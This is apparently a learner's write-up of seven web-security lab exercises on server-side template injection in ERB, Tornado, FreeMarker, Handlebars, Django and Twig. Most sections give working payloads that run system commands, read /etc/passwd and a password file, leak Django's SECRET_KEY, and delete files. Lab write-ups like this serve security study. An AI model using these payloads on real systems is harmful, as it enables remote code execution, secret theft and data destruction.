#### We will follow this methedology during testing this vulnerability: 

![[Pasted image 20220527141408.png]]

## Lab1: Basic server-side template injection
> Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page.

payload =>  <%=foobar%>
* Generally, We will try to cause an error to know the template engine so, you can try any payload. 
- I  will use it in my payload to identify the type of the template in the website in order to identify the correct syntax for this template.
- because the resulting error message will tell me exactly what the template engine is. 

![[Basic_server_side_template_injection.png]]

>When i tried this invalid syntax for this template, this error appeared to me and telled me this is an `erb` template.

ok, after i detected and idenfied the template, i have read the documentaion of the erb.

* Check out this : https://docs.ruby-lang.org/en/2.3.0/ERB.html

- you can use this syntax to write your code: 
==> `<%= someExpression %>`
> <% Ruby code -- inline with output %>
> <%= Ruby expression -- replace with result %>
   <%# comment -- ignored -- useful in testing %>
   % a line of Ruby code -- treated as <% line %> (optional -- see ERB.new)
   
- you can use the `system()` method to execute arbitrary system commands.
 
==> read the passwd file.
> <%= system('cat /etc/passwd') %>


><%= system('ls -al /home/carlos') %>
>> total 32
>> drwxr-xr-x 2 carlos carlos 4096 May 28 06:35 . 
>> drwxr-xr-x 7 root root 4096 May 24 04:17 .. 
>>  -rw-rw-r-- 1 carlos carlos 132 May 28 06:35 .bash_history 
>>  -rw-r--r-- 1 carlos carlos 220 Feb 25 2020 .bash_logout 
>>  -rw-r--r-- 1 carlos carlos 3771 Feb 25 2020 .bashrc 
>>  -rw-r--r-- 1 carlos carlos 807 Feb 25 2020 .profile 
>>  -rw-rw-r-- 1 carlos carlos 6816 May 28 06:35 morale.txt true

> <%= system('rm -r /home/carlos/morale.txt') %>

-----------------------------------------------------------------------
-----------------------------------------------------------------------

## Lab2: Basic SSTI (code context)
- I will inject any invalid syntax for reading the error message to know the template engine.
  
![[identify the template.png]]
- the syntax code in the tornado template ==> {{user.nickname}}
- it is using python syntax in the code and the template syntax is:
	-   `{{` - Used to mark the start of a print statement
	-   `}}` - Used to mark the end of a print statement
	-   `{%` - Used to mark the start of a block statement
	-   `%}` - Used to mark the end of a block statement

- Check out this: https://www.tornadoweb.org/en/stable/template.html

* In the server side will take and compile the code as this will open 2 {{ then will take the value from the parameter and close with 2 }}
*  it will compile this code in order.

* I will do in order as the server but i will inject my payload:
 
{{user.nickname......................i..will..inject..here...........................}}
                            }}{%import os%}{{os.system('ls /home/carlos')

* Then the server will close the }} automatically.

###### my payload ==> `}}{%import os%}{{os.system('ls /home/carlos')`

* The final form with payload after injecting in the server side it will seem like that:
> `{{user.name`  }}{%25import+os%25}{{os.system('ls') `}}`


> user.name}}{%25import+os%25}{{os.system('ls+/home')
> 
> >> carlos elmer install peter user Peter Wiener0

I removed the file with this method ==> remove(file_path)
>}}{%25import+os%25}{{os.remove("/home/carlos/morale.txt")
 another payload:
 }}{%25import+os%25}{{os.system("rm -r /home/carlos/morale.txt")

-----------------------------------------------------------------------
-----------------------------------------------------------------------

## Lab3: SSTI using documentation

- As usual, i tried to cause any errors in the template:
     - i have seen this formt `${.....}` then i edited it to ${foobar}
     
![[Server_side_template_injection_using_documentation.png]]
![[freemarker template.png]]
- from the error message, i have known it is a freemarker template.

> <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat /etc/passwd")}

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls /home/carlos")}

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm -r  /home/carlos/morale.txt")}


---------------------------------------------------------------------
-----------------------------------------------------------------------

## Lab4: SSTI in an unknown language with a documented exploit

At the first when it tried this payload `{{7 * 7}}`, I got this error: 

![[handlebars.png]]

- i did some searches then i knew it is a Handlebars template and we can execute some commands through this code:

>{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
      {{this.push "return require('child_process').execSync('`inject your command here`');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

-----------------------------------------------------------------------
-----------------------------------------------------------------------

## Lab5: SSTI with information disclosure via user-supplied objects
- Ok as usual we caused an error message and we have known this template is working with `django` web framework.

![[django.png]]
- it is wrong to enable `DEBUG` during developing your project because it causes the leak of some data and the objects in your project.
- Check out them:
	- https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/#debug
	- https://docs.djangoproject.com/en/4.0/ref/settings/#debug

- So if we run this payload `{% debug %}` in the template, The Django will display a detailed traceback, including a lot of metadata about the environment.

![[2022-05-30 21_28_09-Server-side template injection with information disclosure via user-supplied obj.png]]

- The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the settings object.
- When you create a new Django project using startproject, the settings.py file is generated automatically, so here notice that you can access the `settings` object.
- And there is a `SECRET_KEY` attribute in the settings.
- Check out: https://docs.djangoproject.com/en/4.0/ref/settings/#secret-key

###### You will use this payload to get the secret key:
- Payload ==> `{{settings.SECRET_KEY}}`

-----------------------------------------------------------------------
-----------------------------------------------------------------------



## Lab6:# SSTI in a sandboxed environment
- After Detecting if there is an SSTI vulnerability through any payload will evaluate correctly like `${7 * 7}`, now we can identify the template by causing the error:

![[sandbox environment.png]]

- another one, It is a freemarker template engine(java).

> ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('`File_Path`').toURL().openStream().readAllBytes()?join(" ")}
- **You will set thi path ==> /home/carlos/my_password.txt
 
![[decimal.png]]
- The contects of file will appear as decimal ASCII code then you can convert it to raw form.

-->Check out the decimal ascci chart :https://www.asciichart.com/

- For doing it quickly, you can use [CyberChef](https://gchq.github.io/CyberChef/)

![[cyberchef.png]]
------------------------------------------------------------------------------------------
- Another payload but you will identify the existing object in the template:
==> Here you will set the `product` object.

><#assign classloader=`object`.class.protectionDomain.classLoader>
  <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
  <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
  <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
  ${dwf.newInstance(ec,null)("`Execute_any_commands_here`")}

- If you will set any object rather than the intended object, this error message will appear for you.

![[missing and null object.png]]

-----------------------------------------------------------------------
-----------------------------------------------------------------------

## Lab7: SSTI with a custom exploit

- I captured the requst and tried with some payloads to cause an error in the teplate.

![[Pasted image 20220531110037.png]]
![[internal server error.png]]
**Here we have known it is an `twig` template engine(PHP).
- **And it is an invalid syntax because the template engine never expected to take a `{`  at the end of the statement.

![[Pasted image 20220531110814.png]]
- Here we injected this payload, and it has been evaluated successfully.

![[Pasted image 20220531110831.png]]


- I have tried to upload anything except images to see what will happen and you will see this error and there is a method is called `setAvatar()` and we will notice the error discloses about the path of `/home/carlos/User.php`.

![[Pasted image 20220531152007.png]]

- Ok, let's go to the `/my-account/change-blog-post-author-display` request and control into the user object and use the `setAvatar()` method.
![[Pasted image 20220531164806.png]]

- This error was appeared, it expresses there is 2 arguments are lost in the method.
![[Pasted image 20220531165020.png]]

- Now we need to know what the 2 arguments are to use `setAvatar()` method?

![[Pasted image 20220531180740.png]]
- The method need to your avatar as argument and the second argument need to the mime type.

**`Take Note`: A **media type** (also known as a **Multipurpose Internet Mail Extensions or MIME type**) indicates the nature and format of a document, file, or assortment of bytes.
Check out: [Common MIME Types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)

![[Pasted image 20220531180312.png]]
-  After insterting your avatar you have to any post in the blog then write a comment to see your avatar has been changed.
- Take the URL for the avatar and run it in your browser.
- capture the request, you will see the avatar which you uploaded as `/etc/passwd` it will retrives the contents of the passwd file.
- you have to set the mime type with `image/png` to bypass it and not to get the error.

![[response.png]]


- When we noticed at the error the path of `/home/carlaos/User.php`  let's try to know what is the content of the file.
![[Pasted image 20220531191428.png]]

- **`Don't forget reload the page before resending the request of the avatar.`

- Here we will see the content of `User.php`.
![[User.php.png]]
- When we read the file we will find many functions, we will use one of them to delete `/.ssh/id_rsa`.
- We must access the file which we need to delete to select the file before deleting.

![[Pasted image 20220531191304.png]]

- During reading the content of the file of `User.php` , You will see a function is called `gdprDelete()`(we will use it to solve the task).

![[Pasted image 20220531192930.png]]

- After accessing the file , we will delete it:

![[Pasted image 20220531193307.png]]